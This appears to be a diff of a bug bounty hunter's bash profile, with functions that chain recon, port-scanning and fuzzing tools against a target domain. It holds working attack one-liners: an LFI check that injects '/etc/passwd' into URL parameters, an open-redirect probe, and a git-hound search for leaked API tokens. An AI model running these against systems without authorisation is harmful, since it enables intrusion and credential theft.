@@ -1,38 +1,35 @@
-#BASHRC-ENUMERATION
+alias vpnip="ifconfig | grep "destination" | awk {print$2} | cut -c9-$p"
+alias serve="sudo python3 -m http.server 80"
 
 githound(){
-echo "$1" | git-hound --dig-files --dig-commits --many-results --regex-file key.txt --results-only > api_tokens.txt
+echo "$1" | git-hound --dig-files --dig-commits --many-results | tee -a api_tokens.txt
 }
 
-lfi () {
-gau $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+lfi(){
+gau -subs $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 }
 
 
-open-redirect () {
-local LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+open-redirect(){
+local LHOST="http://example.com"; gau -subs $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 }
 
 enum(){
         mkdir $1
 	cd $1
         assetfinder -subs-only "$1" | tee -a domains
-        cat domains | anew domains.txt
-	amass enum -brute -active --passive -d "$1" -o domains -config ~/.config/amass/config.ini
-        cat domains | anew domains.txt
-        rm domains
-        subfinder -silent -d "$1" -o domains
+	amass enum -brute -active --passive -d "$1" -config ~/.config/amass/config.ini | tee -a domains
+        subfinder -silent -d "$1" | tee -a domains
         cat domains | anew domains.txt
         rm domains
         cat domains.txt | httpx -silent | tee -a hosts.txt
-        dirsearch -l hosts.txt -t 20 -x 500 -e asp,aspx,htm,html,gz,tgz,zip,txt,php,pl,tar,action,do --exclude-status=301,400,403,500-999
-        echo "$1" | git-hound
-        kr scan "$1" -A=apiroutes-210228:20000 -x 10 --ignore-length=34
+        echo "$1" | git-hound --config-file '/home/piyush/.githound/config.yml' | tee -a git_hound.txt
+        kr scan hosts.txt -A=apiroutes-210228:20000 -x 10 --ignore-length=34
         jaeles scan -s ~/.jaeles/ -U hosts.txt
         cat domains.txt | aquatone -out screens -scan-timeout 200 -screenshot-timeout 60000 -ports xlarge
-        naabu -silent -iL domains.txt | tee -a portscan.txt
+        naabu -silent -top-ports 1000 -l domains.txt | tee -a portscan.txt
         subjack -w domains.txt -t 100 -timeout 20 -o subjack_out.txt --ssl -c /src/github.com/haccer/subjack/fingerprints.json
-	nuclei -l hosts.txt -t ~/nuclei-templates/ -markdown-export reports
-	pluma reports/
-	for i in $(cat hosts.txt); do ffuf -u $i/FUZZ -w ~/Documents/bugbounty/wordlist/dir.txt -ac -c -e php,txt,asp,html,aspx;done
+	nuclei -l hosts.txt -t ~/nuclei-templates/cves -me cve_reports
+	for i in $(cat hosts.txt); do ffuf -u $i/FUZZ -w ~/Documents/bugbounty/wordlist/dirs.txt -ac -c | tee -a  ffuf_txt;done
 }
+
